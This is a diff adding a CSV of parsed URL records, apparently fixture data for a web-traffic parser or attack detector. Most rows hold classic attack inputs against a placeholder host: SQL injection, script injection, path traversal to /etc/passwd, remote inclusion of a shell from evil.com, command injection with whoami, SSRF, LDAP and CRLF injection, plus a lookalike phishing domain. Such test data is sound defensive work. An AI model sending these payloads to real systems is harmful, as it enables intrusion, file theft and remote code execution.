@@ -1,0 +1,16 @@
+source_ip,timestamp,raw_url,scheme,host,port,effective_port,path,path_segments,path_depth,query_string,query_params,query_param_count,fragment,file_extension,method,status_code,user_agent,referrer,source
+0.0.0.0,2026-04-08T15:28:57.155060,http://testphp.vuln/login?id=1 OR 1=1--,http,testphp.vuln,,80,/login,login,1,id=1%20OR%201%3D1--,id=1 OR 1=1--,1,,,GET,,,,ipdr
+0.0.0.0,2026-04-08T15:28:57.155060,"http://testphp.vuln/login?id=1/**/UNION/**/SELECT/**/null,null--",http,testphp.vuln,,80,/login,login,1,id=1%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fnull%2Cnull--,"id=1/**/UNION/**/SELECT/**/null,null--",1,,,GET,,,,ipdr
+0.0.0.0,2026-04-08T15:28:57.155060,http://testphp.vuln/search?q=<script>alert(1)</script>,http,testphp.vuln,,80,/search,search,1,q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,q=<script>alert(1)</script>,1,,,GET,,,,ipdr
+0.0.0.0,2026-04-08T15:28:57.155060,http://testphp.vuln/search?q=%3Cscript%3Ealert(1)%3C/script%3E,http,testphp.vuln,,80,/search,search,1,q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,q=<script>alert(1)</script>,1,,,GET,,,,ipdr
+0.0.0.0,2026-04-08T15:28:57.155060,http://testphp.vuln/download?file=../../etc/passwd,http,testphp.vuln,,80,/download,download,1,file=..%2F..%2Fetc%2Fpasswd,file=../../etc/passwd,1,,,GET,,,,ipdr
+0.0.0.0,2026-04-08T15:28:57.155060,http://testphp.vuln/index.php?page=../../etc/passwd,http,testphp.vuln,,80,/index.php,index.php,1,page=..%2F..%2Fetc%2Fpasswd,page=../../etc/passwd,1,,php,GET,,,,ipdr
+0.0.0.0,2026-04-08T15:28:57.155060,http://testphp.vuln/index.php?page=http://evil.com/shell.php,http,testphp.vuln,,80,/index.php,index.php,1,page=http%3A%2F%2Fevil.com%2Fshell.php,page=http://evil.com/shell.php,1,,php,GET,,,,ipdr
+0.0.0.0,2026-04-08T15:28:57.155060,http://testphp.vuln/ping?ip=127.0.0.1;whoami,http,testphp.vuln,,80,/ping,ping,1,ip=127.0.0.1%3Bwhoami,ip=127.0.0.1;whoami,1,,,GET,,,,ipdr
+0.0.0.0,2026-04-08T15:28:57.155060,http://testphp.vuln/fetch?url=http://127.0.0.1/admin,http,testphp.vuln,,80,/fetch,fetch,1,url=http%3A%2F%2F127.0.0.1%2Fadmin,url=http://127.0.0.1/admin,1,,,GET,,,,ipdr
+0.0.0.0,2026-04-08T15:28:57.156390,http://testphp.vuln/login?user=*)(|(user=*)),http,testphp.vuln,,80,/login,login,1,user=%2A%29%28%7C%28user%3D%2A%29%29,user=*)(|(user=*)),1,,,GET,,,,ipdr
+0.0.0.0,2026-04-08T15:28:57.156390,http://testphp.vuln/page?name=abc%0d%0aSet-Cookie:evil=true,http,testphp.vuln,,80,/page,page,1,name=abc%0D%0ASet-Cookie%3Aevil%3Dtrue,"name=abc
+Set-Cookie:evil=true",1,,,GET,,,,ipdr
+0.0.0.0,2026-04-08T15:28:57.156390,http://arnazon-login.com,http,arnazon-login.com,,80,/,,0,,,0,,,GET,,,,ipdr
+0.0.0.0,2026-04-08T15:28:57.156390,http://testphp.vuln/home,http,testphp.vuln,,80,/home,home,1,,,0,,,GET,,,,ipdr
+0.0.0.0,2026-04-08T15:28:57.156390,http://testphp.vuln/products?id=10,http,testphp.vuln,,80,/products,products,1,id=10,id=10,1,,,GET,,,,ipdr
